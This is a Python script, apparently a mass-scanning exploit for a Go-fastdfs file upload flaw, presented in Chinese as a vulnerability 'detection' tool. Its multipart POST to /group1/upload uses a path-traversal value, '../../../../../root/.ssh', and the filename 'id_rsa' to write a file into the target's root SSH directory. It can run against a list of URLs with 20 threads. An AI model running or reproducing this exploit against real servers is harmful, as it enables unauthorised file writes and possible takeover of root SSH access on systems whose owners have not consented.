import requests
import argparse
import re
import concurrent.futures


def checkVuln(url):
    headers ={
        'Content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryigj9M9EJykZc9u53',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36'
    }

    data = """------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="file"; filename="id"
Content-Type: application/octet-stream

test
------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="scene"

default
------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="filename"

id_rsa
------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="output"

json2
------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="path"

../../../../../root/.ssh
------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="code"


------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="auth_token"


------WebKitFormBoundaryigj9M9EJykZc9u53
Content-Disposition: form-data; name="submit"

upload
------WebKitFormBoundaryigj9M9EJykZc9u53--"""

    try:
        res = requests.post(f"{url}/group1/upload", headers=headers,data=data,
                            timeout=10,verify=False)
        m1 = re.compile(r'"url"\s*:\s*"(.*?)"')
        path = m1.findall(res.text)
        if res.status_code == 200 and res.text :
            if "url" in res.text:
                print(f"\033[1;32m[+] 上传成功! 得到的URL为:{path[0]}" + "\033[0m")
            else:
                print(f"\033[1;31m[-] 上传失败!" + "\033[0m")
        else:
            print(f"\033[1;31m[-] 上传失败!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接 {url} 发生了问题!" + "\033[0m")




def banner():
    print("""   ____        __           _      _  __     _   _       _                 _ 
  / ___| ___  / _| __ _ ___| |_ __| |/ _|___| | | |_ __ | | ___   __ _  __| |
 | |  _ / _ \| |_ / _` / __| __/ _` | |_/ __| | | | '_ \| |/ _ \ / _` |/ _` |
 | |_| | (_) |  _| (_| \__ \ || (_| |  _\__ \ |_| | |_) | | (_) | (_| | (_| |
  \____|\___/|_|  \__,_|___/\__\__,_|_| |___/\___/| .__/|_|\___/ \__,_|\__,_|
                                                  |_|                        
                                                                    By:Bu0uCat
""")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个Go-fastdfs文件上传检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")
